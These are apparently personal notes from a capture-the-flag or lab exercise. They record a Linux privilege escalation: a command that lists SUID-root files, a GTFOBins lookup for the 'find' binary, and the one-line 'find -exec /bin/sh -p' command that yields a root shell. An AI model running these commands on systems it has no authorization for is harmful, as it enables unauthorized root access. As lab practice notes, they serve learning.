#### -Ran the following command to search for SUID files as I was unable to upload privilege escalation scripts:

"find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null"

#### -Found the following when running the above command searching for SUID files:

![](../Pasted%20Images/Pasted%20image%2020220530131113.png)

#### -Found "find" bin in the GTFOBINS website and found the following command to run when "find" is running as SUID:

![](../Pasted%20Images/Pasted%20image%2020220530131140.png)

#FindSUIDprivilegeEscalation

#### -Typed "/usr/bin/find . -exec /bin/sh -p \; -quit" and got a root shell:

![](../Pasted%20Images/Pasted%20image%2020220530131219.png)